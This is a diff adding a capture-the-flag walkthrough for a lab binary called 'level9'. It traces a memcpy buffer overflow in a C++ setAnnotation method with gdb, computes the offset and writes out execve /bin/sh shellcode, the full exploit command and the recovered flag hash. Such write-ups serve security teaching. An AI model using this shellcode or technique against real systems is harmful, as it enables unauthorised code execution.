@@ -1,0 +1,105 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          █████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔══██╗
+██║     █████╗  ██║   ██║█████╗  ██║         ╚██████║
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║          ╚═══██║
+███████╗███████╗ ╚████╔╝ ███████╗███████╗     █████╔╝
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚════╝ 
+
+
+gdb level9
+
+disas main
+
+<+10>:	cmpl   $0x1,0x8(%ebp)
+<+14>:	jg     0x8048610 <main+28>
+
+The program is checking if we have at least one argument. 
+                                                     
+<+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+
+disas _ZN1N13setAnnotationEPc
+
+<+12>:	call   0x8048520 <strlen@plt>
+			....
+<+37>:	call   0x8048510 <memcpy@plt>
+
+There is a call to <memcpy> inside <setAnnotation> function.
+We can try to Buffer Overflow on it.
+
+Check the parameters sent to the memcpy.
+It's the first argument passed to the program.
+So let's use a pattern metasploit in argv[1].
+
+gdb level9
+
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+
+It's segfaulting inside the main.
+Disas to check the exact location:
+
+=> 0x08048682 <+142>:	mov    (%eax),%edx
+
+It fails trying to access the address of EAX.
+
+info register
+-> eax            0x41366441
+
+The EAX register contain a part of our pattern. Get the offset:
+-> 108
+
+The program puts the address of EAX into EDX, then performs a call to EDX a little later.
+
+Let's use a shellcode:
+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+
+By doing several tests, we notice that we can't use an environment variable to store our shellcode, because the addresses change regularly.
+So we will use the addresses starting with 0x0804 and not 0xbfff.
+
+We look for the address where the program store our string.
+Set a breakpoing after the setAnnotation
+
+gdb level9
+b *main+136
+
+x/x $esp
+-> 0x0804a008
+
+x/50x 0x0804a008:
+0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a078:	0x44444444	0x00000000	0x00000000	0x00000000
+0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c8:	0x00000000	0x00000000
+
+
+We see that our characters are begin to be displayed 4 bytes further than 0x0804a008
+So our string is stored at the address 0x0804a00c.
+
+Our goal is to modify the call to EDX so that it calls the content of our string.
+
+python -c "print 'A' * 108 + \x0c\xa0\x04\x08'"`
+//                OFFSET  | ADDRESS OF OUR STRING
+
+We store our shellcode inside our string.
+
+python -c "print 'A' * 87 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'"`
+// 87 = 108 - 21
+// 21 = length of our shellcode
+
+./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
+
+// ADDRESS OF OUR STRING + 4 | SHELLCODE | OFFSET | ADDRESS OF OUR STRING
+
+|══════════════════════════════════════════════════════════════════|
+| f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728 |
+|══════════════════════════════════════════════════════════════════|
+
